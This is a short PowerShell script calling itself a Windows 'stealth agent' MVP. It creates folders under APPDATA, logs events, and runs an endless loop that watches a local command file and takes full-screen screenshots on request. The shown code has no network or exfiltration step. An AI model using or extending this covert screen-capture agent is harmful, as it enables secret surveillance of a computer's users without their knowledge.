# SentinelControlKit - Windows Stealth Agent
# Version: 0.1 (MVP)
# Author: SentinelStack AB

$LogPath = "$env:APPDATA\SentinelX\logs"
$ScreenshotPath = "$env:APPDATA\SentinelX\screens"
$PDFPath = "$env:APPDATA\SentinelX\reports"

# Create folders if not exist
New-Item -ItemType Directory -Force -Path $LogPath | Out-Null
New-Item -ItemType Directory -Force -Path $ScreenshotPath | Out-Null
New-Item -ItemType Directory -Force -Path $PDFPath | Out-Null

Function Log-Event {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path "$LogPath\events.log" -Value "$timestamp - $Message"
}

Function Capture-Screenshot {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $filename = "$ScreenshotPath\screenshot_{0}.png" -f (Get-Date -Format "yyyyMMdd_HHmmss")
    $bitmap.Save($filename, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    Log-Event "Screenshot captured: $filename"
}

Function Monitor-Commands {
    $CommandFile = "$env:APPDATA\SentinelX\cmd.txt"
    if (-Not (Test-Path $CommandFile)) {
        New-Item -Path $CommandFile -ItemType File | Out-Null
    }

    while ($true) {
        $cmd = Get-Content $CommandFile -Raw
        if ($cmd -match "/screenshot") {
            Capture-Screenshot
            Clear-Content $CommandFile
        }
        Start-Sleep -Seconds 5
    }
}

# Start Monitoring
Log-Event "SentinelControlKit agent started"
Monitor-Commands